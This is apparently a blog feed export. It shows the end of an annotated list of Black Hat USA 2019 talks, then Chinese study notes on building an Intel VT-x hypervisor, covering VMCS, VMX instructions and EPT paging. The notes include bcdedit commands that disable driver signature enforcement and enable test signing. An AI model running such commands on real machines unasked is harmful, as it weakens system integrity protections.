<td>Aika Sengirbay,Masha Sedova</td>
<td>Human Factors</td>
</tr>
<tr>
<td>79</td>
<td><a href="https://www.blackhat.com/us-19/briefings/schedule/index.html#managing-for-success-maintaining-a-healthy-bug-bounty-program-long-term-17348">Managing for Success: Maintaining a Healthy Bug Bounty Program Long Term</a></td>
<td>Chloe Brown</td>
<td>Bug Bounty</td>
</tr>
<tr>
<td>80</td>
<td><a href="https://www.blackhat.com/us-19/briefings/schedule/index.html#practical-approach-to-automate-the-discovery-and-eradication-of-open-source-software-vulnerabilities-at-scale-16562">Practical Approach to Automate the Discovery and Eradication of Open-Source Software Vulnerabilities at Scale</a></td>
<td>Aladdin Almubayed</td>
<td>Web AppSec,Security Development Lifecycle</td>
</tr>
<tr>
<td>81</td>
<td><a href="https://www.blackhat.com/us-19/briefings/schedule/index.html#new-vulnerabilities-in-g-networks-15279">New Vulnerabilities in 5G Networks</a>5G 商用网络的漏洞，漏洞可被利用实现中间人劫持和定向攻击</td>
<td>Ravishankar Borgaonkar,Altaf Shaik</td>
<td>Network Defense,Mobile</td>
</tr>
<tr>
<td>82</td>
<td><a href="https://www.blackhat.com/us-19/briefings/schedule/index.html#predictive-vulnerability-scoring-system-16147">Predictive Vulnerability Scoring System</a></td>
<td>Jay Jacobs,Michael Roytman</td>
<td>Network Defense,Enterprise</td>
</tr>
<tr>
<td>83</td>
<td><a href="https://www.blackhat.com/us-19/briefings/schedule/index.html#selling--days-to-governments-and-offensive-security-companies-14453">Selling 0-Days to Governments and Offensive Security Companies</a>对 0-Day 市场买卖交易双方的介绍（和 ISC2019 的相同）</td>
<td>Maor Shwartz,Maor Shwartz</td>
<td>Policy,Community,Policy,Community</td>
</tr>
<tr>
<td>84</td>
<td><a href="https://www.blackhat.com/us-19/briefings/schedule/index.html#zombie-ant-farming-practical-tips-for-playing-hide-and-seek-with-linux-edrs-14780">Zombie Ant Farming: Practical Tips for Playing Hide and Seek with Linux EDRs</a></td>
<td>Dimitry Snezhkov</td>
<td>Applied Security,Malware</td>
</tr>
<tr>
<td>85</td>
<td><a href="https://www.blackhat.com/us-19/briefings/schedule/index.html#automation-techniques-in-c-reverse-engineering-17064">Automation Techniques in C++ Reverse Engineering</a></td>
<td>Rolf Rolles</td>
<td>Reverse Engineering</td>
</tr>
<tr>
<td>86</td>
<td><a href="https://www.blackhat.com/us-19/briefings/schedule/index.html#backdooring-hardware-devices-by-injecting-malicious-payloads-on-microcontrollers-15015">Backdooring Hardware Devices by Injecting Malicious Payloads on Microcontrollers</a></td>
<td>Sheila Ayelen Berta</td>
<td>Reverse Engineering,Hardware/Embedded</td>
</tr>
<tr>
<td>87</td>
<td><a href="https://www.blackhat.com/us-19/briefings/schedule/index.html#sensor-and-process-fingerprinting-in-industrial-control-systems-16102">Sensor and Process Fingerprinting in Industrial Control Systems</a></td>
<td>Mujeeb Ahmed Chuadhry,Martin Ochoa</td>
<td>Applied Security,Smart Grid/Industrial Security</td>
</tr>
<tr>
<td>88</td>
<td><a href="https://www.blackhat.com/us-19/briefings/schedule/index.html#critical-zero-days-remotely-compromise-the-most-popular-real-time-os-15559">Critical Zero Days Remotely Compromise the Most Popular Real-Time OS</a></td>
<td>Dor Zusman,Ben Seri</td>
<td>Network Defense,Internet of Things</td>
</tr>
<tr>
<td>89</td>
<td><a href="https://www.blackhat.com/us-19/briefings/schedule/index.html#fantastic-red-team-attacks-and-how-to-find-them-16540">Fantastic Red-Team Attacks and How to Find Them</a></td>
<td>Ross Wolf,Casey Smith</td>
<td>Applied Security,Data Forensics/Incident Response</td>
</tr>
<tr>
<td>90</td>
<td><a href="https://www.blackhat.com/us-19/briefings/schedule/index.html#the-path-less-traveled-abusing-kubernetes-defaults-17049">The Path Less Traveled: Abusing Kubernetes Defaults</a></td>
<td>Duffie Cooley,Ian Coldwater</td>
<td>Platform Security</td>
</tr>
<tr>
<td>91</td>
<td><a href="https://www.blackhat.com/us-19/briefings/schedule/index.html#inside-the-apple-t-15686">Inside the Apple T2</a></td>
<td>Jeremy Erickson,Mikhail Davidov</td>
<td>Hardware/Embedded,Platform Security</td>
</tr>
<tr>
<td>92</td>
<td><a href="https://www.blackhat.com/us-19/briefings/schedule/index.html#chipfail---glitching-the-silicon-of-the-connected-world-15192">Chip.Fail - Glitching the Silicon of the Connected World</a></td>
<td>Josh Datko,Thomas Roth</td>
<td>Internet of Things,Hardware/Embedded</td>
</tr>
<tr>
<td>93</td>
<td><a href="https://www.blackhat.com/us-19/briefings/schedule/index.html#making-big-things-better-the-dead-cow-way-15778">Making Big Things Better the Dead Cow Way</a></td>
<td>Luke Benfey,Christien Rioux,Peiter Mudge Zatko,Joseph Menn</td>
<td>Community</td>
</tr>
<tr>
<td>94</td>
<td><a href="https://www.blackhat.com/us-19/briefings/schedule/index.html#come-join-the-cafsa---continuous-automated-firmware-security-analysis-14918">Come Join the CAFSA - Continuous Automated Firmware Security Analysis</a>固件分析工具 FwAnalyzer 的详细介绍，针对文件系统的静态分析，并不针对漏洞发现，会检测一些文件的权限，是否包含一些安全机制等，并形成一个分析报告。</td>
<td>Collin Mulliner</td>
<td>Hardware/Embedded,Security Development Lifecycle</td>
</tr>
<tr>
<td>95</td>
<td><a href="https://www.blackhat.com/us-19/briefings/schedule/index.html#preventing-authentication-bypass-a-tale-of-two-researchers-17041">Preventing Authentication Bypass: A Tale of Two Researchers</a></td>
<td>Ravi Jaiswal,Ron Chan,Terry Zhang</td>
<td>Applied Security,Security Development Lifecycle</td>
</tr>
<tr>
<td>96</td>
<td><a href="https://www.blackhat.com/us-19/briefings/schedule/index.html#securing-the-system-a-deep-dive-into-reversing-android-pre-installed-apps-16040">Securing the System: A Deep Dive into Reversing Android Pre-Installed Apps</a>Google Project Zero，Android 系统预装 App 的逆向深度分析</td>
<td>Maddie Stone</td>
<td>Reverse Engineering,Mobile</td>
</tr>
<tr>
<td>97</td>
<td><a href="https://www.blackhat.com/us-19/briefings/schedule/index.html#towards-discovering-remote-code-execution-vulnerabilities-in-apple-facetime-15436">Towards Discovering Remote Code Execution Vulnerabilities in Apple FaceTime</a>盘古，Apple FaceTime 的架构、相关攻击面以及一些漏洞</td>
<td>Tielei Wang,Tao Huang</td>
<td>Exploit Development</td>
</tr>
<tr>
<td>98</td>
<td><a href="https://www.blackhat.com/us-19/briefings/schedule/index.html#finding-a-needle-in-an-encrypted-haystack-leveraging-cryptographic-abilities-to-detect-the-most-prevalent-attacks-on-active-directory-15486">Finding a Needle in an Encrypted Haystack: Leveraging Cryptographic Abilities to Detect the Most Prevalent Attacks on Active Directory</a></td>
<td>Yaron Zinar,Marina Simakov</td>
<td>Network Defense,Enterprise</td>
</tr>
<tr>
<td>99</td>
<td><a href="https://www.blackhat.com/us-19/briefings/schedule/index.html#a-compendium-of-container-escapes-16091">A Compendium of Container Escapes</a>一篇针对容器逃逸的概述，主要内容包括了 linux 内核容器基础，执行逃逸，docker、RunC等容器的漏洞以及内核漏洞利用的研究</td>
<td>Nick Freeman,Brandon Edwards</td>
<td>Exploit Development,Platform Security</td>
</tr>
<tr>
<td>100</td>
<td><a href="https://www.blackhat.com/us-19/briefings/schedule/index.html#adventures-in-the-underland-the-cqforensic-toolkit-as-a-unique-weapon-against-hackers-17076">Adventures in the Underland: The CQForensic Toolkit as a Unique Weapon Against Hackers</a></td>
<td>Paula Januszkiewicz</td>
<td>Data Forensics/Incident Response</td>
</tr>
<tr>
<td>101</td>
<td><a href="https://www.blackhat.com/us-19/briefings/schedule/index.html#attacking-iphone-xs-max-14444">Attacking iPhone XS Max</a>这个议题介绍了 UNIX socket bind 操作因临时 unlock 引发的竞争条件，最终导致了一个 UAF 漏洞，作者介绍了该漏洞在 A12 之前和之后的漏洞利用方法</td>
<td>Hao Xu,Tielei Wang</td>
<td>Exploit Development,Mobile</td>
</tr>
<tr>
<td>102</td>
<td><a href="https://www.blackhat.com/us-19/briefings/schedule/index.html#infiltrating-corporate-intranet-like-nsa---pre-auth-rce-on-leading-ssl-vpns-15545">Infiltrating Corporate Intranet Like NSA - Pre-auth RCE on Leading SSL VPNs</a></td>
<td>Meh Chang,Orange Tsai</td>
<td>Web AppSec,Enterprise</td>
</tr>
<tr>
<td>103</td>
<td><a href="https://www.blackhat.com/us-19/briefings/schedule/index.html#everybody-be-cool-this-is-a-robbery-16233">Everybody be Cool, This is a Robbery!</a></td>
<td>Jean-Baptiste Bédrune,Gabriel Campana</td>
<td>Hardware/Embedded</td>
</tr>
<tr>
<td>104</td>
<td><a href="https://www.blackhat.com/us-19/briefings/schedule/index.html#hacking-ten-million-useful-idiots-online-propaganda-as-a-socio-technical-security-project-15456">Hacking Ten Million Useful Idiots: Online Propaganda as a Socio-Technical Security Project</a></td>
<td>Pablo Breuer,David Perlman</td>
<td>Policy,Human Factors</td>
</tr>
<tr>
<td>105</td>
<td><a href="https://www.blackhat.com/us-19/briefings/schedule/index.html#integration-of-cyber-insurance-into-a-risk-management-program-17254">Integration of Cyber Insurance Into A Risk Management Program</a></td>
<td>Jake Kouns</td>
<td>Cyber Insurance</td>
</tr>
<tr>
<td>106</td>
<td><a href="https://www.blackhat.com/us-19/briefings/schedule/index.html#hostsplit-exploitable-antipatterns-in-unicode-normalization-14786">HostSplit: Exploitable Antipatterns in Unicode Normalization</a></td>
<td>Jonathan Birch</td>
<td>Applied Security,Web AppSec</td>
</tr>
<tr>
<td>107</td>
<td><a href="https://www.blackhat.com/us-19/briefings/schedule/index.html#lessons-from-two-years-of-crypto-audits-14738">Lessons From Two Years of Crypto Audits</a></td>
<td>Jean-Philippe Aumasson</td>
<td>Security Development Lifecycle,Cryptography</td>
</tr>
<tr>
<td>108</td>
<td><a href="https://www.blackhat.com/us-19/briefings/schedule/index.html#securing-apps-in-the-open-by-default-cloud-16428">Securing Apps in the Open-By-Default Cloud</a></td>
<td>Michael Wozniak,Winston Howes</td>
<td>Enterprise,Security Development Lifecycle</td>
</tr>
<tr>
<td>109</td>
<td><a href="https://www.blackhat.com/us-19/briefings/schedule/index.html#look-no-hands----the-remote-interaction-less-attack-surface-of-the-iphone-15203">Look, No Hands! — The Remote, Interaction-less Attack Surface of the iPhone</a></td>
<td>Natalie Silvanovich</td>
<td>Mobile,Exploit Development</td>
</tr>
<tr>
<td>110</td>
<td><a href="https://www.blackhat.com/us-19/briefings/schedule/index.html#the-discovery-of-a-government-malware-and-an-unexpected-spy-scandal-16222">The Discovery of a Government Malware and an Unexpected Spy Scandal</a></td>
<td>Lorenzo Franceschi-Bicchierai</td>
<td>Mobile,Malware</td>
</tr>
<tr>
<td>111</td>
<td><a href="https://www.blackhat.com/us-19/briefings/schedule/index.html#mitre-attck-the-play-at-home-edition-15035">MITRE ATT&amp;CK: The Play at Home Edition</a></td>
<td>Ryan Kovar,Katie Nickels</td>
<td>Data Forensics/Incident Response,Applied Security</td>
</tr>
<tr>
<td>112</td>
<td><a href="https://www.blackhat.com/us-19/briefings/schedule/index.html#the-future-of-ato-15906">The Future of ATO</a></td>
<td>Philip Martin</td>
<td>Web AppSec,Applied Security</td>
</tr>
<tr>
<td>113</td>
<td><a href="https://www.blackhat.com/us-19/briefings/schedule/index.html#breaking-samsungs-arm-trustzone-14932">Breaking Samsung’s ARM TrustZone</a></td>
<td>Joffrey Guilbon,Alexandre Adamski,Maxime Peterlin</td>
<td>Hardware/Embedded,Mobile</td>
</tr>
<tr>
<td>114</td>
<td><a href="https://www.blackhat.com/us-19/briefings/schedule/index.html#responding-to-a-cyber-attack-with-missiles-17063">Responding to a Cyber Attack with Missiles</a></td>
<td>Mikko Hypponen</td>
<td>Policy</td>
</tr>
<tr>
<td>115</td>
<td><a href="https://www.blackhat.com/us-19/briefings/schedule/index.html#worm-charming-harvesting-malware-lures-for-fun-and-profit-15536">Worm Charming: Harvesting Malware Lures for Fun and Profit</a></td>
<td>Pedram Amini</td>
<td>Applied Security,Malware</td>
</tr>
<tr>
<td>116</td>
<td><a href="https://www.blackhat.com/us-19/briefings/schedule/index.html#command-injection-in-f-irules-16194">Command Injection in F5 iRules</a></td>
<td>Christoffer Jerkeby</td>
<td>Web AppSec,Network Defense</td>
</tr>
<tr>
<td>117</td>
<td><a href="https://www.blackhat.com/us-19/briefings/schedule/index.html#debug-for-bug-crack-and-hack-apple-core-by-itself---fun-and-profit-to-debug-and-fuzz-apple-kernel-by-lldb-script-15616">Debug for Bug: Crack and Hack Apple Core by Itself - Fun and Profit to Debug and Fuzz Apple Kernel by lldb Script</a>使用苹果自带的 LLDB Script fuzz macOS 系统内核</td>
<td>Moony Li,Lilang Wu</td>
<td>Platform Security</td>
</tr>
<tr>
<td>118</td>
<td><a href="https://www.blackhat.com/us-19/briefings/schedule/index.html#arm-ida-and-cross-check-reversing-the-boeing-s-core-network-15716">Arm IDA and Cross Check: Reversing the Boeing 787’s Core Network</a></td>
<td>Ruben Santamarta</td>
<td>Hardware/Embedded,Reverse Engineering</td>
</tr>
<tr>
<td>119</td>
<td><a href="https://www.blackhat.com/us-19/briefings/schedule/index.html#exploring-the-new-world--remote-exploitation-of-sqlite-and-curl-15726">Exploring the New World : Remote Exploitation of SQLite and Curl</a></td>
<td>HuiYu Wu,YuXiang Li,Wenxiang Qian</td>
<td>Internet of Things,Exploit Development</td>
</tr>
<tr>
<td>120</td>
<td><a href="https://www.blackhat.com/us-19/briefings/schedule/index.html#controlled-chaos-the-inevitable-marriage-of-devops--security-15273">Controlled Chaos: The Inevitable Marriage of DevOps &amp; Security</a></td>
<td>Nicole Forsgren,Kelly Shortridge</td>
<td>Applied Security,Security Development Lifecycle</td>
</tr>
<tr>
<td>121</td>
<td><a href="https://www.blackhat.com/us-19/briefings/schedule/index.html#how-to-detect-that-your-domains-are-being-abused-for-phishing-by-using-dns-15159">How to Detect that Your Domains are Being Abused for Phishing by Using DNS</a></td>
<td>Karl Lovink,Arnold Hölzel</td>
<td>Policy,Applied Security</td>
</tr>
<tr>
<td>122</td>
<td><a href="https://www.blackhat.com/us-19/briefings/schedule/index.html#every-security-team-is-a-software-team-now-17280">Every Security Team is a Software Team Now</a></td>
<td>Dino Dai Zovi</td>
<td>Keynote</td>
</tr>
<tr>
<td>123</td>
<td><a href="https://www.blackhat.com/us-19/briefings/schedule/index.html#a-decade-after-bleichenbacher--rsa-signature-forgery-still-works-16143">A Decade After Bleichenbacher ‘06, RSA Signature Forgery Still Works</a></td>
<td>Sze Yiu Chau</td>
<td>Web AppSec,Cryptography</td>
</tr>
</tbody>
</table>
</div>
]]></content>
      <categories>
        <category>安全会议</category>
      </categories>
      <tags>
        <tag>安全会议</tag>
        <tag>blackhat</tag>
      </tags>
  </entry>
  <entry>
    <title>Hypervisor From Scratch</title>
    <url>/2020/04/16/Hypervisor-From-Scratch/</url>
    <content><![CDATA[<p>Hypervisor From Scratch 系列文章学习笔记</p>
<p><a href="https://github.com/SinaKarvandi/Hypervisor-From-Scratch/">实验代码</a></p>
<span id="more"></span>
<h1 id="Part-1-基本概念和环境搭建"><a href="#Part-1-基本概念和环境搭建" class="headerlink" title="Part 1: 基本概念和环境搭建"></a><a href="https://rayanfam.com/topics/hypervisor-from-scratch-part-1/">Part 1: 基本概念和环境搭建</a></h1><div class="table-container">
<table>
<thead>
<tr>
<th></th>
<th></th>
<th></th>
</tr>
</thead>
<tbody>
<tr>
<td>Intel</td>
<td>VT-x</td>
<td>Virtual Machine eXtension (VMX)</td>
</tr>
<tr>
<td>AMD</td>
<td>AMD-V</td>
<td>Secure Virtual Machine (SVM)</td>
</tr>
</tbody>
</table>
</div>
<ul>
<li><a href="https://rayanfam.com/topics/inline-assembly-in-x64/">x64 Inline Assembly in Windows Driver Kit</a></li>
<li><a href="https://resources.infosecinstitute.com/writing-a-windows-kernel-driver/">Writing a Windows Kernel Driver</a></li>
</ul>
<figure class="highlight gradle"><table><tr><td class="code"><pre><span class="line">[HKEY_LOCAL_MACHINE<span class="regexp">/SYSTEM/</span>CurrentControlSet<span class="regexp">/Control/</span>Session Manager/Debug <span class="keyword">Print</span> Filter] </span><br><span class="line"><span class="keyword">DEFAULT</span>=dword:<span class="number">0000000</span>f</span><br></pre></td></tr></table></figure>
<div class="table-container">
<table>
<thead>
<tr>
<th>关键概念</th>
<th></th>
</tr>
</thead>
<tbody>
<tr>
<td>Virtual Machine Monitor (VMM)</td>
<td>VMM acts as a host and has full control of the processor(s) and other platform hardware. A VMM is able to retain selective control of processor resources, physical memory, interrupt management, and I/O.</td>
</tr>
<tr>
<td>Guest Software</td>
<td>Each virtual machine (VM) is a guest software environment.</td>
</tr>
<tr>
<td>VMX Root Operation and VMX Non-root Operation</td>
<td>A VMM will run in VMX root operation and guest software will run in VMX non-root operation</td>
</tr>
<tr>
<td>VMX transitions</td>
<td>Transitions between VMX root operation and VMX non-root operation.</td>
</tr>
<tr>
<td>VM entries</td>
<td>Transitions into VMX non-root operation.</td>
</tr>
<tr>
<td>Extended Page Table (EPT)</td>
<td>A modern mechanism which uses a second layer for converting the guest physical address to host physical address.</td>
</tr>
<tr>
<td>VM exits</td>
<td>Transitions from VMX non-root operation to VMX root operation.</td>
</tr>
<tr>
<td>Virtual machine control structure (VMCS)</td>
<td>a data structure in memory that exists exactly once per VM (or more precisely one per each VCPU [Virtual CPU]), while it is managed by the VMM. With every change of the execution context between different VMs, the VMCS is restored for the current VM, defining the state of the VM’s virtual processor and VMM control Guest software using VMCS.</td>
</tr>
</tbody>
</table>
</div>
<p>VMCS由6部分组成: <a href="https://rayanfam.com/wp-content/uploads/sites/2/2018/08/VMCS.pdf">VMCS结构图</a></p>
<div class="table-container">
<table>
<thead>
<tr>
<th></th>
<th></th>
</tr>
</thead>
<tbody>
<tr>
<td>Guest-state area</td>
<td>Processor state saved into the guest state area on VM exits and loaded on VM entries.</td>
</tr>
<tr>
<td>Host-state area</td>
<td>Processor state loaded from the host state area on VM exits.</td>
</tr>
<tr>
<td>VM-execution control fields</td>
<td>Fields controlling processor operation in VMX non-root operation.</td>
</tr>
<tr>
<td>VM-exit control fields</td>
<td>Fields that control VM exits.</td>
</tr>
<tr>
<td>VM-entry control fields</td>
<td>Fields that control VM entries.</td>
</tr>
<tr>
<td>VM-exit information fields</td>
<td>Read-only fields to receive information on VM exits describing the cause and the nature of the VM exit.</td>
</tr>
</tbody>
</table>
</div>
<div class="table-container">
<table>
<thead>
<tr>
<th>VMX指令</th>
<th></th>
</tr>
</thead>
<tbody>
<tr>
<td>INVEPT</td>
<td>Invalidate Translations Derived from EPT</td>
</tr>
<tr>
<td>INVVPID</td>
<td>Invalidate Translations Based on VPID</td>
</tr>
<tr>
<td>VMCALL</td>
<td>Call to VM Monitor</td>
</tr>
<tr>
<td>VMCLEAR</td>
<td>Clear Virtual-Machine Control Structure</td>
</tr>
<tr>
<td>VMFUNC</td>
<td>Invoke VM function</td>
</tr>
<tr>
<td>VMLAUNCH</td>
<td>Launch Virtual Machine</td>
</tr>
<tr>
<td>VMRESUME</td>
<td>Resume Virtual Machine</td>
</tr>
<tr>
<td>VMPTRLD</td>
<td>Load Pointer to Virtual-Machine Control Structure</td>
</tr>
<tr>
<td>VMPTRST</td>
<td>Store Pointer to Virtual-Machine Control Structure</td>
</tr>
<tr>
<td>VMREAD</td>
<td>Read Field from Virtual-Machine Control Structure</td>
</tr>
<tr>
<td>VMWRITE</td>
<td>Write Field to Virtual-Machine Control Structure</td>
</tr>
<tr>
<td>VMXOFF</td>
<td>Leave VMX Operation</td>
</tr>
<tr>
<td>VMXON</td>
<td>Enter VMX Operation</td>
</tr>
</tbody>
</table>
</div>
<p><img src="https://rayanfam.com/wp-content/uploads/sites/2/2018/08/vmm-life-cycle.png" alt="VMM生命周期"></p>
<h1 id="Part-2-开启VMX"><a href="#Part-2-开启VMX" class="headerlink" title="Part 2: 开启VMX"></a><a href="https://rayanfam.com/topics/hypervisor-from-scratch-part-2/">Part 2: 开启VMX</a></h1><ul>
<li>关闭驱动签名验证 <code>bcdedit.exe /set nointegritychecks on</code></li>
<li>打开测试模式 <code>bcdedit /set testsigning on</code></li>
<li><p>一边按住<code>Shift</code>一边重启，选择<code>7</code>关闭签名验证（仅本次有效）</p>
</li>
<li><p>IRP Major Functions</p>
<ul>
<li>IRP_MJ_CREATE</li>
<li>IRP_MJ_DEVICE_CONTROL</li>
</ul>
</li>
<li>IRP Minor Functions (mainly used for PnP manager to notify for a special event)</li>
<li><p>Fast I/O</p>
<ul>
<li>先、快于IRP</li>
</ul>
</li>
<li><p>检查Hypervisor支持</p>
<ul>
<li><code>EAX = 0</code> <code>CPUID</code>检查字符串<code>GenuineIntel</code>，判断是否为Intel处理器</li>
<li><code>CPUID.1:ECX.VMX[bit 5] = 1</code>，判断是否支持VMX</li>
</ul>
</li>
<li><p>开启VMX</p>
<ul>
<li><code>CR4.VMXE[bit 13] = 1</code></li>
</ul>
</li>
<li><p>MyHypervisorDriver调用<code>IoCreateDevice</code>函数创建设备并为其<code>IRP_MJ_CREATE</code>指定<code>DrvCreate</code>函数，<code>DrvCreate</code>函数开启VMX，并调用<code>DbgPrint</code>函数输出，用Dbgview中查看。</p>
</li>
<li>MyHypervisorApp利用<code>__asm</code>检查CPU是否支持VMX，如果支持则调用<code>CreateFile</code>函数打开设备，触发驱动的<code>DrvCreate</code>函数，开启VMX。</li>
</ul>
<h1 id="Part-3-建立第一个虚拟机"><a href="#Part-3-建立第一个虚拟机" class="headerlink" title="Part 3: 建立第一个虚拟机"></a><a href="https://rayanfam.com/topics/hypervisor-from-scratch-part-3/">Part 3: 建立第一个虚拟机</a></h1><ul>
<li>IOCTL(32bit)<ul>
<li>METHOD_BUFFERED</li>
<li>METHOD_NIETHER</li>
<li>METHOD_IN_DIRECT</li>
<li>METHOD_OUT_DIRECT</li>
</ul>
</li>
</ul>
<div class="table-container">
<table>
<thead>
<tr>
<th>内核函数/宏</th>
<th></th>
</tr>
</thead>
<tbody>
<tr>
<td>KeQueryActiveProcessorCount</td>
<td>获取逻辑处理器数</td>
</tr>
<tr>
<td>KeSetSystemAffinityThread</td>
<td>将当前线程分配到某个逻辑处理器上</td>
</tr>
<tr>
<td>KeRevertToUserAffinityThread</td>
<td>恢复线程运行的处理器</td>
</tr>
<tr>
<td>MmGetPhysicalAddress</td>
<td>虚拟地址-&gt;物理地址</td>
</tr>
<tr>
<td>MmGetVirtualForPhysical</td>
<td>物理地址-&gt;虚拟地址</td>
</tr>
<tr>
<td>MmAllocateContiguousMemory</td>
<td>申请对齐的连续内存</td>
</tr>
<tr>
<td>MmFreeContiguousMemory</td>
<td>释放上述内存</td>
</tr>
<tr>
<td>RtlSecureZeroMemory</td>
<td>初始化内存为0</td>
</tr>
<tr>
<td>__readmsr</td>
<td>读取IA32_FEATURE_CONTROL_MSR，用于检查VMX支持、保存RevisionId</td>
</tr>
<tr>
<td>__vmx_on</td>
<td></td>
</tr>
<tr>
<td>__vmx_vmptrld</td>
<td></td>
</tr>
<tr>
<td>__vmx_off</td>
<td></td>
</tr>
<tr>
<td>PAGED_CODE</td>
<td>确保调用线程运行在一个允许分页的足够低IRQL级别</td>
</tr>
</tbody>
</table>
</div>
<p><img src="https://rayanfam.com/wp-content/uploads/sites/2/2018/09/VMXLifecycle.png" alt="VMX生命周期"></p>
<p><img src="https://rayanfam.com/wp-content/uploads/sites/2/2018/09/Init-VMCS.png" alt="VMCS结构"></p>
<ul>
<li>MyHypervisorDriver调用<code>IoCreateDevice</code>函数创建设备并为其<code>IRP_MJ_CREATE</code>指定<code>DrvCreate</code>函数，为<code>IRP_MJ_CLOSE</code>指定<code>DrvClose</code>函数。<code>DrvCreate</code>函数初始化VMX，为每个逻辑处理器开启<code>VMX</code>并为<code>VMXON</code>和<code>VMCS</code>分配内存，<code>DrvClose</code>则相反。</li>
<li><p>MyHypervisorApp调用<code>CreateFile</code>函数打开设备，触发驱动的<code>DrvCreate</code>函数，开启VMX，并为每个逻辑处理器的<code>VMXON</code>和<code>VMCS</code>分配内存；调用<code>CloseHandle</code>关闭设备，触发驱动的<code>DrvClose</code>函数，关闭<code>VMX</code>并释放内存。</p>
</li>
<li><p>用户态和VMM驱动交互</p>
<ul>
<li>MyHypervisorDriver为<code>IRP_MJ_DEVICE_CONTROL</code>指定<code>DrvIOCTLDispatcher</code>函数，与MyHypervisorApp通过<code>IOCTL</code>通信（内存读取）。MyHypervisorApp调用<code>DeviceIoControl</code>函数并指定<code>IoControlCode</code>触发<code>DrvIOCTLDispatcher</code>。</li>
</ul>
</li>
</ul>
<h1 id="Part-4-使用EPT进行地址转换"><a href="#Part-4-使用EPT进行地址转换" class="headerlink" title="Part 4: 使用EPT进行地址转换"></a><a href="https://rayanfam.com/topics/hypervisor-from-scratch-part-4/">Part 4: 使用EPT进行地址转换</a></h1><ul>
<li><a href="https://connormcgarr.github.io/paging/">Turning the Pages: Introduction to Memory Paging on Windows 10 x64</a><ul>
<li>Windbg<ul>
<li><code>!pte</code><ul>
<li>PXE = PML4E</li>
<li>PPE = PDPE</li>
</ul>
</li>
<li><code>!vtop</code> 将虚拟地址转换为物理地址</li>
</ul>
</li>
</ul>
</li>
<li><p><a href="https://www.triplefault.io/2017/07/introduction-to-ia-32e-hardware-paging.html">Introduction to IA-32e hardware paging</a></p>
<ul>
<li>Intel 64位分页机制</li>
<li>PG flag: CR0[bit 31]: 开启分页</li>
<li>Physical Address Extension (PAE): CR4[bit 5]: 未设置则使用32bit分页</li>
<li>Long Mode Enable (LME): Extended Feature Enable Register (IA32_EFER MSR)[bit 8]: 未设置则使用PAE 36bit分页，否则使用64bit的4层分页机制<ul>
<li>Page Frame Number (PFN): the next paging structure in the hierarchy (0x1000 4 KB)</li>
<li>4096bytes 512 entries(PFN)</li>
<li><code>CR3</code>保存第一个页结构的物理地址</li>
<li>虚拟地址<ul>
<li>[bits 63-48] 保留</li>
<li>[bits 47-39] a PML4 table (located in CR3) offset</li>
<li>[bits 38-30] a Page Directory Pointer Table (PDPT) offset</li>
<li>[bits 29-21] a Page Directory (PD) offset</li>
<li>[bits 20-12] a Page Table (PT) offset</li>
<li>[bits 11-00] 物理页中的偏移</li>
</ul>
</li>
</ul>
</li>
<li>使用Windbg具体分析</li>
</ul>
</li>
<li><p>Second Level Address Translation (SLAT) or nested paging</p>
<ul>
<li>an extended layer in the paging mechanism</li>
<li>hardware-based virtualization virtual addresses -&gt; physical memory</li>
<li>实现<ul>
<li>AMD: Rapid Virtualization Indexing (RVI)/Nested Page Tables (NPT)</li>
<li>Intel: Extended Page Table (EPT)</li>
<li>ARM: Stage-2 page-tables</li>
</ul>
</li>
<li>两种方法<ul>
<li>Shadow Page Tables (Software-assisted paging)</li>
<li>Extended Page Tables (Hardware-assisted paging)<ul>
<li>Page table maintained by guest OS generate the guest-physical address.</li>
<li>Page table maintained by VMM map guest physical address to host physical address.</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
<p><img src="https://rayanfam.com/wp-content/uploads/sites/2/2018/08/ept-translation.png" alt="EPT地址转换"></p>
<p><img src="https://rayanfam.com/wp-content/uploads/sites/2/2018/10/EPTP.png" alt="EPTP结构"></p>
<p><img src="https://rayanfam.com/wp-content/uploads/sites/2/2018/10/EPT-Layout.png" alt="EPT整体结构"></p>
<p>MyHypervisorDriver添加了EPT的初始化代码，为64bit的4层地址转换的每个结构表申请内存空间。</p>
<h1 id="Part-5-建立VMCS并在虚拟机中执行代码"><a href="#Part-5-建立VMCS并在虚拟机中执行代码" class="headerlink" title="Part 5: 建立VMCS并在虚拟机中执行代码"></a><a href="https://rayanfam.com/topics/hypervisor-from-scratch-part-5/">Part 5: 建立VMCS并在虚拟机中执行代码</a></h1><div class="table-container">
<table>
<thead>
<tr>
<th>内核函数</th>
<th></th>
</tr>
</thead>
<tbody>
<tr>
<td>__vmx_vmptrst</td>
<td></td>
</tr>
<tr>
<td>__vmx_vmclear</td>
<td></td>
</tr>
<tr>
<td>__vmx_vmptrld</td>
<td></td>
</tr>
<tr>
<td>__vmx_vmlaunch</td>
<td></td>
</tr>
<tr>
<td>__vmx_vmread</td>
<td></td>
</tr>
<tr>
<td>__vmx_vmwrite</td>
<td>将数据写入VMCS的指定字段</td>
</tr>
<tr>
<td>__vmx_vmresume</td>
</tr>
</tbody>
</table>
</div>
<div class="table-container">
<table>
<thead>
<tr>
<th>VMX Controls</th>
<th></th>
<th></th>
</tr>
</thead>
<tbody>
<tr>
<td>VM-Execution Controls</td>
<td>Primary Processor-Based VM-Execution Controls<br>Secondary Processor-Based VM-Execution Controls</td>
<td>设置VMCS</td>
</tr>
<tr>
<td>VM-entry Control Bits</td>
<td></td>
<td></td>
</tr>
<tr>
<td>VM-exit Control Bits</td>
<td></td>
<td></td>
</tr>
<tr>
<td>PIN-Based Execution Control</td>
<td></td>
<td>governs the handling of asynchronous events</td>
</tr>
<tr>
<td>Activity State</td>
<td>0:Active 1:HLT 2:Shutdown 3:Wait-for-SIPI</td>
<td></td>
</tr>
<tr>
<td>Interruptibility State</td>
<td>permit certain events to be blocked for a period of time</td>
</tr>
</tbody>
</table>
</div>
<p>MyHypervisorDriver通过<code>__vmx_vmwrite</code>设置<code>VMCS</code>的各项内容（非常复杂），并调用<code>LaunchVM</code>在第0号虚拟处理器上设置<code>VMCS</code>（设置<code>CPU_BASED_HLT_EXITING</code>即在<code>HLT</code>时调用<code>VM-Exit</code>，设置<code>HOST_RIP</code>指向<code>VMExitHandler</code>在处理<code>EXIT_REASON_HLT</code>中调用<code>VMXOFF</code>），最后调用<code>__vmx_vmlaunch</code>执行<code>HLT(\xF4)</code>，触发<code>VM-Exit</code>。</p>
